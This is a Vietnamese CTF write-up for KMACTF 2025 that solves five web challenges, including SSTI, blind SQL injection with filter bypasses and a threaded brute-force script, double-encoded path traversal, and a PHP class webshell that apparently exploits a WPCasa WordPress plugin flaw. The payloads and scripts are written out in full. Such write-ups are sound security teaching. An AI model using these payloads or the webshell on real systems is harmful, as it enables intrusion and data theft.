---
title: Writeup KMACTF 2025
published: 2025-09-29
tags: [Writeup]
image: "https://hackmd.io/_uploads/S1goIuvhxg.png"
category: Writeup
---

# KMA CTF 2025: 
## YDSYD : 
Bài này server cho user `admin` có `isAdmin : true` sẵn rồi.
![image](https://hackmd.io/_uploads/B1Qq6I8hgx.png)

Ở endpoint `/login` ko có sự filter nào về user `admin`
![image](https://hackmd.io/_uploads/S1maaI82xx.png)
Vậy chỉ cần login vào với user là `admin` là đã có token JWT và get flag thôi.

```HTTP=
POST /login HTTP/2
Host: ydsyd.wargame.vn
Content-Type: application/json
Content-Length: 16

{"user":"admin"}
```
![image](https://hackmd.io/_uploads/SJHa0U8ngg.png)

Và chỉ cần gắn cookie vào, POST tới `annyeong` là đã được flag : 
![image](https://hackmd.io/_uploads/BkSZJP8nle.png)

```HTTP
POST /annyeong HTTP/2
Host: ydsyd.wargame.vn
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NTkwNDMyMzAsImV4cCI6MTc1OTA0NjgzMH0.9Aeue-p_znn_7PGm7SOoPDqm1Ryq5Ds2z86GF-UtqJI
Content-Type: application/json
Content-Length: 2

{}
```

![image](https://hackmd.io/_uploads/r1e7yPU3eg.png)
FLAG : `KMACTF{Y1u__50lv3d_Y0u_L1ved??<3}`

## ACL and H1 : 
Challenge này có vuln SSTI ở `/render`
![image](https://hackmd.io/_uploads/rkWsJDL2xg.png)

Nhận `filepath` sau đó sẽ read file và `render_template_string` với nội dung file.
Và cho chúng ta upload file, nó sẽ random name sau đó save vào `uploads`
![image](https://hackmd.io/_uploads/B1SklPIhgg.png)

Hàm `allow_file` sẽ check file coi có phải là `txt` hoặc `html` hay không.
![image](https://hackmd.io/_uploads/Hy6Xgv8hlx.png)

Và challenge này sử dụng `gunicorn` làm sv proxy.
config : 
```conf
map /render http://gunicorn-server:8088/internal @action=deny @method=post @method=get
map / http://gunicorn-server:8088/
```
Thì nó sẽ chặn rq tới `/render` `http://gunicorn-server:8088/internal` với method post hoặc get.
`/render` chính là chỗ chúng ta cần truy cập để trigger `SSTI`
Thì gunicorn có CVE` Http Requests Smuggling` nhưng ở biên bản thấp hơn, mà author sử dụng `gunicorn==23.0.0` nên phải tìm cách bypass khác.

Để ý thì author dùng `map /render` Vậy sẽ ra sao khi chúng ta encode endpoint đó và gửi lên sv.
Khi gửi rq bình thường : 
![image](https://hackmd.io/_uploads/BJRlGwUngx.png)
Encode : 
![image](https://hackmd.io/_uploads/r1OdfD8hxx.png)

Vậy là đã truy cập được , bây giờ upload file chứa payload SSTI RCE để get flag thôi : 
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /*').read() }}
```
Sau khi upload thì đã được path : 
![image](https://hackmd.io/_uploads/Hk57QwUhxl.png)
See all file : 
![image](https://hackmd.io/_uploads/BkTrXDInee.png)
Render + url encoding : 
![image](https://hackmd.io/_uploads/SJpvQwL2xe.png)

Flag : `KMACTF{HTTP/1.1_Must_Di3_or_Not?????}`

## vibe_coding : 

Challenge này có 2 service là `nodejs` và `python`
Service `python` chứa flag và được return khi call `process_action` với `username` là `admin` và `action` là `readFlag`
![image](https://hackmd.io/_uploads/H1OnND8nle.png)

Ở endpoint `/execute` (Đã rút gọn code) Thì sẽ nhận POST tới và get `username`,`request_id `,`action` từ `request.form.get('...').strip()`
```python
@app.route('/execute', methods=['POST'])
def execute_handler():
    try:
        username = request.form.get('username', '').strip()
        request_id = request.form.get('requestid', '').strip()
        action = request.form.get('action', '').strip()
        
        if not username or not request_id or not action:
            return send_error_response(
                "Missing required fields",
                "username, requestid, and action are required",
                400
            )
        
            ...    
        
        return jsonify(response), 200
        
    except Exception as e:
            ...
```
hàm `.strip()` sẽ xoá space ở đầu và ở cuối của `variable`.
Service python chỉ cho phép local, ko mở port ra bên ngoài.
![image](https://hackmd.io/_uploads/r1dWUvU3lg.png)

Service `nodejs`
```javascript
app.post('/register', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({
            error: 'Username and password are required'
        });
    }

    if( typeof username !== 'string' || typeof password !== 'string' ) {
        return res.status(400).json({
            error: 'Username and password must be strings'
        });
    }

    // Validate username length (must be > 5 characters)
    if (username.length <= 5) {
        return res.status(400).json({
            error: 'Username must be longer than 5 characters'
        });
    }

    if (users[username]) {
        return res.status(400).json({
            error: 'User already exists'
        });
    }

    try {
        const hashedPassword = await bcrypt.hash(password, 10);
        users[username] = {
            username,
            password: hashedPassword,
            createdAt: new Date().toISOString()
        };

        res.json({
            message: 'User registered successfully',
            username: username,
            hint: 'Now you can login to get JWT token'
        });
    } catch (error) {
        res.status(500).json({
            error: 'Registration failed',
            message: error.message
        });
    }
});
```
Endpoint này cho register, check `users[username]` xem nếu có báo user đã tồn tại hoặc lỗi thì return `failed`
Còn `/action` sẽ get data từ requests của user. Sau đó sẽ gửi về server python `/execute` : 
![image](https://hackmd.io/_uploads/S1U7FcL2gl.png)

Để ý thì `register, login` sẽ ở bên service nodejs. Còn khi action qua service của python thì nó sẽ nhận data và `.strip()` 
![image](https://hackmd.io/_uploads/BkkjY58hll.png)
Ý tưởng : 

Chúng ta có thể lợi dụng điều này để reg username `  admin        ` (có space ở 2 đầu) để register và login.
Sau đó khi server `nodejs` forward qua server `python` thì sẽ strip và chúng ta đã được user là `admin` trong requests tới `/execute`.
Register : 
```markdown
POST /register HTTP/1.1
Host: 165.22.55.200:50004
Connection: keep-alive
Content-Type: application/json
Content-Length: 43

{"username":"  admin ","password":"duc193"}
```

![image](https://hackmd.io/_uploads/Hkpgj583ll.png)

Login : 
```markdown
POST /login HTTP/1.1
Host: 165.22.55.200:50004
Connection: keep-alive
Content-Type: application/json
Content-Length: 43

{"username":"  admin ","password":"duc193"}
```
![image](https://hackmd.io/_uploads/ryo-o9Lhgl.png)

Get flag : 

```markdown
POST /action HTTP/1.1
Host: 165.22.55.200:50004
Connection: keep-alive
Content-Type: application/json
Authorization: Beaber eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IiAgYWRtaW4gIiwiaWF0IjoxNzU5MDU4NjgxLCJleHAiOjE3NTkxNDUwODF9.YlixecXi8vByAOr-xZSGv7b1uXQD7lPldoGwvQRFHaM
Content-Length: 21

{"action":"readFlag"}
```
![image](https://hackmd.io/_uploads/S1TPi5Ihll.png)
flag : `KMACTF{how_can_you_pollute_param_@@_}`

## Data Lost Prevention : 
Challenge này cho chúng ta 1 trang web như sau : 
![image](https://hackmd.io/_uploads/B1mpjqU2xx.png)

Để ý vào chức năng `search` và chức năng `export`.
Đầu tiên thì phải xác định flag nằm ở đâu đã : 
![image](https://hackmd.io/_uploads/ryO-h5I3lx.png)

Thì đoạn code này sẽ check coi trong `attachments` có `is_lost=1` trong db chưa, có r thì out. Chưa có thì sẽ gen `uuidv4` rename file flag và gắn vào path `/var/data/flags`.
Sau đó sẽ add vào table `attachments` với `filename` là `Q2-incident-raw.csv` và `storage_path` là path tới file flag vừa gen.

`/api/search.php` : 
![image](https://hackmd.io/_uploads/BJMOp58nll.png)

Đoạn này có dính vuln SQL Injection do chèn `$filtered` vào payload sql. Dù đã qua filter nhưng vẫn k an toàn.
- `$q2 = preg_replace('/\s+/u', '', $q);` đoạn này sẽ filter và replace các khoảng trắng. Bao gồm `space,tab,\n,...`
- `$q2 = preg_replace('/\b(?:or|and)\b/i', '', $q2);` dòng này sẽ replace `or` và `and` (không phân biệt viết hoa hay thường.). Lưu ý là do có `\b` nên là chỉ có `or` hoặc `and` đứng một mình mới bị replace. Nên là ko thể bypass bằng cách dùng `oorr` hay `anandd`. Nhưng mà có thể dùng `||`,`&&` thay cho `or` và `and`.
- `$q2 = str_ireplace(["union","load_file","outfile","="], '', $q2);` Hàm này chỉ đơn giảnn là replace các kí tự nếu có trong chuỗi (Ko phân biệt Hoa, thường).
Và lưu ý là chuỗi sau khi replace xong sẽ được check `strlen` dưới 90 kí tự mới cho phép query

Đây là payload gốc : 
```php
$sql = "SELECT id,title FROM cases WHERE title RLIKE '.*$filtered' AND owner_id = :uid LIMIT 1";
```
Thì chỉ trả về json `(bool)$row` nên chúng ta cần query blind boolean để trả về row hoặc ko.
Vậy cần payload ngắn mà đáp ứng được điều kiện trên : 
Sau một hồi fuzz thử thì được payload như sau : 

![image](https://hackmd.io/_uploads/rk-Sbi8nex.png)


payload : 

```sql
-'union select 1,1 FROM(attachments)where substr(storage_path,1,1)like'/'#
```
(`-'` để làm cho nó return sai vế trước.)
Sau đó dùng union để select 2 row và get `storage_path` từ `attachments`, sau đó substring để bruteforce từng kí tự.

Bypass filter : 
- Vì union bị filter nên có thể chèn `unio=n` để khi nó replace `=` sẽ còn chuỗi `union`.
- Bypass filter space bằng `/**/`
- Đoạn `FROM(attachments)` thì dùng cách này để khỏi phải dùng `/**/FROM/**/attachments/**/` để payload ngắn hơn.

- Đoạn `substring(storage_path,1,1)like'/'#` viết liền để hạn chế dùng space (Nhưng mà nó vẫn chạy được.)

- Thay `/**/` vào payload : 

```sql
-'union/**/select/**/1,1/**/FROM(attachments)where/**/substr(storage_path,1,1)like'/'#
```

Được payload 86 kí tự, hợp lí rồi.
Script Brute tên file : 

```python
import requests
base_url = "https://dlp.wargame.vn/api/search.php?q="
cookies = {"PHPSESSID": "d005006fea64b1d184298adaaf03502e"}
headers = {"Connection": "keep-alive"}
file = "/var/data/flags/flag_2986112"
# Cho _ ở cuối bởi vì chúng ta dùng LIKE nó sẽ luôn true khi có _ (Có thể dùng để check length)
# Nhưng mà do name flag không có `_` nên là thôi bỏ cũng được.
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.-{}_"
def gen_payload(index,ch):
    sql  = f"-'uni%3don%2f**%2fselect%2f**%2f1%2c1%2f**%2fFROM(attachments)where%2f**%2fsubstr(storage_path%2c{index}%2c1)like'{ch}'%23"
    return sql
for i in range(27,100):
    for ch in CHARSET:
        payload = gen_payload(i,ch)
        url = base_url + payload
        a = requests.get(url)
        if "true" in a.text:
            file += ch
            break
    print(file)
```

Do trên server hơi lag nên GPT để script đa luồng cho nhanh : 

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time

base_url = "https://dlp.wargame.vn/api/search.php?q="
cookies = {"PHPSESSID": "d005006fea64b1d184298adaaf03502e"}
headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (ctf-bruter)"}
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.-{}"

file_path = ""

MAX_WORKERS = 10
REQUEST_TIMEOUT = 8
RETRY = 2
SLEEP_BETWEEN_INDEX = 0.05

def gen_payload(index, ch):
    sql  = f"-'uni%3don%2f**%2fselect%2f**%2f1%2c1%2f**%2fFROM(attachments)where%2f**%2fsubstr(storage_path%2c{index}%2c1)like'{ch}'%23"
    return sql

def probe_char(session: requests.Session, index: int, ch: str) -> bool:
    url = base_url + gen_payload(index, ch)
    tries = 0
    while tries <= RETRY:
        try:
            r = session.get(url, cookies=cookies, headers=headers, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            if "true" in r.text:
                return True
            return False
        except requests.RequestException:
            tries += 1
            time.sleep(0.2)
    return False

def find_char_at_index(session: requests.Session, index: int) -> str | None:
    found_event = threading.Event()
    found_char = None
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(probe_char, session, index, ch): ch for ch in CHARSET}

        try:
            for fut in as_completed(futures):
                ch = futures[fut]
                try:
                    ok = fut.result()
                except Exception:
                    ok = False
                if ok:
                    found_char = ch
                    found_event.set()
                    break
        finally:
            pass

    return found_char

def main():
    global file_path
    start = 1
    end = 100

    with requests.Session() as session:
        for i in range(start, end):
            ch = find_char_at_index(session, i)
            if ch is None:
                print(f"[{i}] No char found -> stopping.")
                break
            file_path += ch
            print(f"[{i}] found: {ch} -> {file_path}")
            time.sleep(SLEEP_BETWEEN_INDEX)

    print("Done. Final:", file_path)

if __name__ == "__main__":
    main()
```
Nhớ thay cookie vào chạy chứ không bị lỗi.
Được tên flag : 
![image](https://hackmd.io/_uploads/HybELs82gg.png)

`/var/data/flags/flag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt`

Bên `export.php`
![image](https://hackmd.io/_uploads/Bk5BLsInee.png)
Thì sẽ check while nếu có `../` sẽ replace thành `""`
(Không thể dùng `..././`) vì nó có đệ quy)
Để ý thì nó có `urldecode` nên chúng ta có thể encoding 2 lần gửi lên để bypass qua filter.
2 lần do 1 lần server tự decode, lần thứ 2 là do code.

path traversal về : 
`../../data/flags/flag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt`
double url encode : 
`..%252f..%252fdata%252fflags%252fflag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt`

![image](https://hackmd.io/_uploads/ryPgwoLnlx.png)
Flag : 
`KMACTF{i'M_bL1nd_bUt_u_'r3_Sm4rZZZZ}`


## CVE-2025-93XX : 

Challenge này author cho chúng ta 1 file WordPress : 

Sau khi dựng local lên thì vào page admin.

Thì challenge WP thường đa số sẽ target vào plugin WP. Nên là check thử Plugin trong `wp-admin` : 
(Ở đây mình tự active 2 plugin)
![image](https://hackmd.io/_uploads/r1Ug_sIhgl.png)
Vậy là có 2 plugin là `Safe PHP Class Upload (read-only, non-executable)` version `0.1` (author `meulody` tên author challenge này ) và `WPCasa` version `1.4.1 `

Khi search thử thì thấy có CVE của `wpcasa`

https://zeropath.com/blog/cve-2025-9321-wpcasa-wordpress-plugin-code-injection-summary

`CVE 2025-9321`

Tóm tắt thì plugin `WPCasa` có chứa lỗ hổng `Code Injection` cho phép attacker call hàm `api_requests` nằm ở file `includes/class-wpsight-api.php` và có thể dẫn tới RCE. 
Do không `WhiteList`, `filter blacklist` input nên dẫn tới việc attacker có thể tấn công vào và RCE.

Vì CVE này mới ra được 6 ngày nên chưa có PoC (1day).

![image](https://hackmd.io/_uploads/r1sTOiI3lx.png)

Mở thử file đó lên xem như nào đã : 
Khi khởi tạo class nó sẽ chạy `__construct()` 
- `add_filter( 'query_vars', array( $this, 'add_query_vars'), 0 );` : thêm biến query `wpsight-api` vào danh sách `query_vars` của `WordPress`.
- `add_action( 'parse_request', array( $this, 'api_requests'), 0 );` : Hook vào quá trình parse request để xử lý khi có request tới endpoint API.
- ` function add_query_vars( $vars ) ` : Mở rộng query vars của `WordPress` để chấp nhận tham số `?wpsight-api=...` trên URL.

![image](https://hackmd.io/_uploads/Skhm4PPhxl.png)
Hàm `api_requests` sẽ có flow như sau : 
- Nếu tồn tại `$_GET['wpsight-api']` → gán vào `$wp->query_vars['wc-api']`.
- Sau đó check nếu có `$wp->query_vars['wc-api']` sẽ `ob_start()` Hàm này sẽ không cho script nếu được chạy in ra output ra ngoài. Đây là lí do tại sao khi gọi echo nó không in ra.
- Tiếp tục sẽ gắn `$api` từ `wpsight-api` `lowercase`. Sau đó nếu tồn tại class thì khởi tạo class đó. với `new $api()`

![image](https://hackmd.io/_uploads/rkHBFj82el.png)

Ban đầu thì ý tưởng là tìm sink để RCE nhưng mà không được, do chỉ cho mỗi reg new Class, không cho truyền j vào.
Sau thì nghĩ lại thấy plugin upload của author : 
![image](https://hackmd.io/_uploads/SkDZ9i83ll.png)
Đầu tiên sẽ khởi tạo và `add_action('rest_api_init', function ()` để nhận rq post tới.
![image](https://hackmd.io/_uploads/HJIM5jL2ex.png)

flow sẽ như sau : 
Nhận file -> check coi nếu file có size > 64 byte thì throw lỗi. -> read file và check phải có `Class ...` -> sau đó sẽ check xem chúng ta có sử dụng hàm bị cấm không.
![image](https://hackmd.io/_uploads/SJK09sI2lg.png)

Rồi mới save vào file `.txt`
![image](https://hackmd.io/_uploads/H1gelssU3lx.png)
Câu hỏi đặt ra là save vào file txt thì làm sao mà dùng Class này để có thể trigger CVE được.

Để tìm hiểu rõ hơn thì CTRL SHIFT F `uploads_safe_classes`
![image](https://hackmd.io/_uploads/Hy6rss8hgl.png)
Và chúng ta đã tìm thấy author đã sửa đoạn code này để `include` file txt vào. 
![image](https://hackmd.io/_uploads/Sy4ujjUhee.png)

Và đoạn code này nằm trong hàm `__construct` của class `WPSight_Framework`
Lệnh `wpsight();` ở cuối file được gọi mỗi lần `WordPress` load plugin này.
Trong function đó, nếu biến global `$wpsight` chưa tồn tại, nó sẽ `new WPSight_Framework()` và sẽ làm load `constructor`.
:::note
Mà mỗi lần truy cập web thì `wp` sẽ `load plugin` cho chúng ta, vậy chúng ta có thể coi như server luôn trigger `include` file txt.
:::
![image](https://hackmd.io/_uploads/Bkia9PD2ee.png)

Vậy thì upload sẽ ở `endpoint` nào : 
![image](https://hackmd.io/_uploads/SJ33jiL3ee.png)
Thì nó sẽ `add_action` vào `rest_api_init` nên là mình tìm thấy docs : 
https://developer.wordpress.org/rest-api/extending-the-rest-api/adding-custom-endpoints/

![image](https://hackmd.io/_uploads/Sy4lhoU2el.png)

Vậy là chúng ta có thể gọi upload bằng query : 
`?rest_route=/safe-upload/v1/upload`

![image](https://hackmd.io/_uploads/rJhtnoU2xe.png)

Upload thành công.
![image](https://hackmd.io/_uploads/H1Ma2sIhxl.png)

Vậy giờ tìm cách để rce, bypass filter và size 64byte.

Thì trong magic method của PHP có function magic method `__construct` là hàm sẽ được chạy khi chúng ta khởi tạo 1 object.
Vậy thì chúng ta có thể lợi dung nó với cách gọi hàm `$a($b)` để RCE. (Dùng payload này là do nó ngắn để ko bị dính quá 64 kí tự)
Ví dụ :
![image](https://hackmd.io/_uploads/ryHFCsI3gx.png)

Và để control thì chúng ta có thể dùng `$_GET[1]($_GET[2])` để truyền tham số vào bằng requests.


payload : 

```php
<?php class cc{function __construct(){$_GET[1]($_GET[2]);}}
```
upload : 

```bash
curl -X POST "http://localhost:8082/?rest_route=/safe-upload/v1/upload" -F "file=@123.txt"
```
![image](https://hackmd.io/_uploads/SJAMynLngg.png)
```HTTP=
GET /?wpsight-api=cc&1=system&2=ls HTTP/1.1
Host: localhost:8082
Connection: keep-alive

```
![image](https://hackmd.io/_uploads/HyBdk2Lnex.png)

Vì nó luôn `die(1)` nên phải blind exploit.
get Flag bằng cách copy file `flag.php` ra `/var/www/html`

`cat /var/www/html/flag* |base64 > /var/www/html/duc193_xxxxxx.txt`
Được flag local : 
![image](https://hackmd.io/_uploads/ryb7eh83ex.png)

Flag server : 
![image](https://hackmd.io/_uploads/B1MRx2U3xl.png)
![image](https://hackmd.io/_uploads/H1Zy-nLngl.png)

Flag : `KMACTF{Y3s_it's__1dayupload_php_class_4nd_ex3cut3_it_⚆_⚆}`

Còn 1 payload nữa đó chính là sử dụng hàm `include`

```php
<?php class cd{function __construct(){include($_GET[1]);}}
```

Vì hàm LFI có rất nhiều cách khai thác khác nhau để RCE. Các bạn có thể tham khảo ở 
https://to016.github.io/posts/PHPLFI2RCE/
Và còn nhiều cách khác các bạn có thể tìm hiểu thêm.
Nhưng ở bài này mình làm theo cách PHP FilterChain cho nhanh.

Bài phân tích của a Endy cho các bạn dễ hiểu : 
https://hackmd.io/@endy/Skxms9eW2

Và cách gen payload thì có tool hỗ trợ : 
https://github.com/synacktiv/php_filter_chain_generator

Sau khi download về thì chạy 
```bash
python3 php_filter_chain_generator.py --chain '<?php echo `cat fl* > duc_193.txt`; ?>'
```
Copy đoạn filterChain giống vậy: 
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=php://temp
```

![image](https://hackmd.io/_uploads/B1MpRPw2gg.png)


Sau khi upload file lên thì requests tới : 
![image](https://hackmd.io/_uploads/SJq2k_v3gl.png)

Và chúng ta đã có flag.
![image](https://hackmd.io/_uploads/BkapJ_Phge.png)

:::note
Lưu ý : đây là mình làm local nên đã xoá đoạn `ob_start();` và `ob_end_clean();` để có thể nhận output cho dễ test. Do bây giờ server đang bị lỗi rồi.
:::